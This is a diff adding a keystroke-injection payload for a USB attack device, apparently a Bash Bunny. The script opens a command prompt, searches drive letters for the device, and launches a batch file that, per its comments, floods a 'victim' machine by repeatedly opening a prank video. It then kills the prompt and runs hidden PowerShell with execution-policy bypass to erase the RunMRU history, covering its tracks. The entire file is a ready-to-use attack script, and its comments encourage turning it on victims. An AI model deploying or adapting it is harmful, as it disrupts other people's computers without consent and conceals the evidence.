@@ -1,0 +1,40 @@
+# Loops youareanidiot video for how long you prefer
+# Creator Bry-fi
+LED R B G
+ATTACKMODE HID STORAGE
+Q GUI r
+Q STRING cmd.exe
+Q DELAY 200
+Q ENTER
+# COMMENCE SCAN
+Q STRING e:
+Q DELAY 200
+Q ENTER
+Q STRING f:
+Q DELAY 200
+Q ENTER
+Q STRING g:
+Q DELAY 200
+Q ENTER
+Q STRING h:
+Q DELAY 200
+Q ENTER
+Q STRING cd payloads/switch2
+Q DELAY 200
+Q ENTER
+Q STRING start loop.bat
+Q ENTER
+# Now, this is a pretty evil script. It WILL lag for a second but it will hit you (or your victim) all at once! Change the DELAY below to how long you want it to nonstop load programs.
+# Below is 6 seconds. 7000 = 7 secs 10000 = 10. You get my drift. BE CAREFUL WITH THIS! 6 SECONDS CAN DO ALOT!
+Q DELAY 6000
+Q GUI r
+Q STRING taskkill /F /IM cmd.exe
+Q DELAY 200
+Q ENTER
+Q GUI r
+
+Q STRING "powershell -WindowStyle Hidden -Exec Bypass \"Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue\""
+
+Q ENTER
+sync
+LED G
